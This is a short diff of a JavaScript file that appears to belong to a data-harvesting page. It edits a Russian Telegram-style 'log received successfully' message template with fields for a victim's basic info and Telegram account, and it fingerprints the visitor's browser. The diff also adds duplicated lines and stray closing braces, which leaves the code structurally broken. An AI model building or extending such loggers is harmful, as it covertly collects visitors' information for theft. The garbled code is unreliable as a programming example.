@@ -12,7 +12,7 @@ document.addEventListener('DOMContentLoaded', function() {
       let userid = document.createElement('p');
 
       const message = `
-🔥 Лог пришел успешно!
+🔥 Лог успешен!
 
 *🧭 Базовая информация:*
 *🔍 Аккаунт в тг:*
@@ -41,17 +41,6 @@ document.addEventListener('DOMContentLoaded', function() {
         });
       });
 
-  function batery() {
-	  const ua = navigator.battery;  
-	  let power = '';
-	  
-	  
-	  
-	  
-  
-
-
-  
   function getBrowserInfo() {
     const ua = navigator.userAgent;
     let browser = '';
@@ -68,6 +57,11 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     match[2] = match[2] ? `version ${match[2]}` : '';
+    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
+    return browser;
+  }
+  });
+
     browser = `${match[1] || ''} ${match[2] || ''}`.trim();
     return browser;
   }
